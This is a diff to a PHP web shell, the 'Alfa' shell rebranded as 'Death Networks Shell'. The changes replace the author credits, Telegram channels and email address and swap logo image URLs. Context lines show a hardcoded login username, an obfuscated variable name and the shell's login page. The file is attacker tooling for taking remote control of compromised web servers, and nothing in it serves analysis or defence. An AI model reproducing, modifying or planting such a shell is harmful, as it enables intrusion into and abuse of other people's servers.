@@ -1,10 +1,10 @@
 <?php
 /*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
+	Author: 	Keccy/Death-Networks
+	Telegram: 	https://t.me/keccy
+	Channel:: 	https://t.me/deathbase
+	Gmail:		ryphon@proton.me
+	Date:		Monday, May 5, 2025
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'death',
@@ -533,7 +533,7 @@ body{background: black;}
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>~ Death Networks Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="Death Networks 2012" draggable="false" src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.gif" /></center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="Death Networks 2012" draggable="false" src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Death Networks Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
@@ -675,7 +675,7 @@ img {
 </head>
 <body>
 
-<img src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.png" draggable="false">
+<img src="https://raw.githubusercontent.com/qeize/tools/refs/heads/main/logo.gif" draggable="false">
 
 <div id="typedtext"></div>
 
